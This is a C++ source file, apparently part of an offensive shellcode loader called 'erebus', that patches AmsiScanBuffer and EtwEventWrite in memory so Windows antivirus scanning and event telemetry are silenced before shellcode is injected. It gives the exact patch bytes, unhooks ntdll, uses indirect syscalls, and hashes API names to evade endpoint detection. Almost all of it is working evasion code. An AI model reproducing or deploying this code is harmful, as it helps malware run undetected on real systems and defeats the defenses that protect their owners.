/**
 * @file evasion.cpp
 * @brief AMSI and ETW runtime patching
 *
 * Patches AmsiScanBuffer and EtwEventWrite at runtime to suppress security
 * telemetry before shellcode decryption and injection.
 *
 * OPSEC notes:
 *   - Module and function names are resolved via API hashing (ImportModule /
 *     ImportFunction are hashed through H() in loader.hpp), so no plaintext
 *     "amsi.dll" / "AmsiScanBuffer" / "EtwEventWrite" strings reach .rdata.
 *   - Protection flips go through NtProtectVirtualMemory rather than
 *     VirtualProtect, which keeps the patch operation off the most common
 *     user-mode hook surface.
 *   - AMSI is resolved via PEB walk first; the loader only falls back to
 *     LoadLibraryC (LdrLoadDll) when the host process has not already mapped
 *     amsi.dll.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion.hpp"
#include "../../include/evasion/syscall_backend.hpp"
#if CONFIG_CALLSTACK_SPOOF_ENABLED
#include "../../include/evasion/callstack_spoof.hpp"
#endif

namespace erebus {
namespace evasion {

    // ------------------------------------------------------------------
    // Protection flip helper using NtProtectVirtualMemory.
    // Returns TRUE on success, fills *oldProtect with the prior value.
    // ------------------------------------------------------------------
    static BOOL FlipProtection(LPVOID addr, SIZE_T size, ULONG newProtect, PULONG oldProtect)
    {
        // Prefer the indirect-syscall shim planted by InitIndirectSyscalls().
        // The shim runs no code of its own beyond `mov r10, rcx; mov eax, ssn;
        // jmp <gadget>`, so the actual `syscall` instruction executes from
        // inside ntdll's .text where kernel telemetry expects it.
        typeNtProtectVirtualMemory NtProtectVirtualMemory =
            (typeNtProtectVirtualMemory)GetSyscallStub(H("NtProtectVirtualMemory"));

        // Fall back to the (post-unhook) hashed import if the indirect
        // path is unavailable. This covers the narrow window before
        // InitIndirectSyscalls runs and the "unhook failed" case.
        //
        // NOTE: ImportFunction() expands to `type name = (type)resolver(...)`,
        // which would declare a NEW local `NtProtectVirtualMemory` shadowing
        // the outer one and leaving that outer (still-NULL) slot unchanged.
        // Fetch via GetProcAddressC directly so the outer variable receives
        // the resolved pointer.
        if (!NtProtectVirtualMemory) {
            HMODULE ntdll = ImportModule("ntdll.dll");
            if (!ntdll) return FALSE;
            NtProtectVirtualMemory = (typeNtProtectVirtualMemory)
                erebus::GetProcAddressC(ntdll, H("NtProtectVirtualMemory"));
            if (!NtProtectVirtualMemory) return FALSE;
        }

        PVOID base = addr;
        SIZE_T region = size;
        NTSTATUS status = NtProtectVirtualMemory(
            (HANDLE)(LONG_PTR)-1,   // current process pseudo-handle
            &base,
            &region,
            newProtect,
            oldProtect
        );
        return NT_SUCCESS(status);
    }

    // ----------------------------------------------------------------
    // AMSI bypass - patch AmsiScanBuffer
    // ----------------------------------------------------------------

    BOOL PatchAmsi()
    {
        // Try PEB-walk first; only fall back to LdrLoadDll if AMSI is not
        // already mapped into the host. The common .NET-host case never
        // touches a loader API.
        HMODULE hAmsi = ImportModule("amsi.dll");
        if (!hAmsi)
        {
            hAmsi = erebus::LoadLibraryC(L"amsi.dll");
            if (!hAmsi)
            {
                LOG_INFO("amsi.dll not loaded, skipping AMSI patch");
                return TRUE;
            }
        }

        typedef LONG (WINAPI *typeAmsiScanBuffer)(
            HANDLE, PVOID, ULONG, LPCWSTR, HANDLE, PVOID);
        ImportFunction(hAmsi, AmsiScanBuffer, typeAmsiScanBuffer);
        if (!AmsiScanBuffer)
        {
            LOG_ERROR("Failed to resolve AmsiScanBuffer");
            return FALSE;
        }

        // x64 patch: mov eax, 0x80070057; ret  (6 bytes)
        // x86 patch: mov eax, 0x80070057; ret 0x18  (8 bytes)
#ifdef _WIN64
        BYTE patch[] = {
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC3                            // ret
        };
#else
        BYTE patch[] = {
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC2, 0x18, 0x00               // ret 0x18
        };
#endif

        ULONG oldProtect = 0;
        if (!FlipProtection((LPVOID)AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("NtProtectVirtualMemory failed on AmsiScanBuffer");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)AmsiScanBuffer, patch, sizeof(patch));

        ULONG dummy = 0;
        FlipProtection((LPVOID)AmsiScanBuffer, sizeof(patch), oldProtect, &dummy);

        LOG_SUCCESS("AMSI patched (AmsiScanBuffer -> E_INVALIDARG)");
        return TRUE;
    }

    // ----------------------------------------------------------------
    // ETW bypass - patch EtwEventWrite
    // ----------------------------------------------------------------

    BOOL PatchEtw()
    {
        HMODULE hNtdll = ImportModule("ntdll.dll");
        if (!hNtdll)
        {
            LOG_ERROR("Failed to get ntdll.dll for ETW patch");
            return FALSE;
        }

        typedef ULONG (WINAPI *typeEtwEventWrite)(
            ULONGLONG RegHandle, PVOID EventDescriptor, ULONG UserDataCount, PVOID UserData);
        ImportFunction(hNtdll, EtwEventWrite, typeEtwEventWrite);
        if (!EtwEventWrite)
        {
            LOG_ERROR("Failed to resolve EtwEventWrite");
            return FALSE;
        }

        // xor eax, eax; ret  (3 bytes) - returns STATUS_SUCCESS
        BYTE patch[] = {
            0x33, 0xC0,  // xor eax, eax
            0xC3         // ret
        };

        ULONG oldProtect = 0;
        if (!FlipProtection((LPVOID)EtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("NtProtectVirtualMemory failed on EtwEventWrite");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)EtwEventWrite, patch, sizeof(patch));

        ULONG dummy = 0;
        FlipProtection((LPVOID)EtwEventWrite, sizeof(patch), oldProtect, &dummy);

        LOG_SUCCESS("ETW patched (EtwEventWrite -> nop)");
        return TRUE;
    }

    // ----------------------------------------------------------------
    // Combined entry point
    // ----------------------------------------------------------------

    BOOL RunEvasionPatches()
    {
        // Unhook ntdll first so AMSI / ETW patches and all downstream
        // syscalls use clean stubs. A failed unhook is non-fatal - the
        // AMSI / ETW patches still have a chance of landing through
        // whatever hook is in place.
        UnhookNtdll();

#if CONFIG_CALLSTACK_SPOOF_ENABLED
        InitCallstackSpoof();
#endif

        BOOL amsi_ok = PatchAmsi();
        BOOL etw_ok  = PatchEtw();
        // Partial success is acceptable - AMSI may not be loaded in
        // non-.NET host processes.
        return amsi_ok || etw_ok;
    }

} // namespace evasion
} // namespace erebus
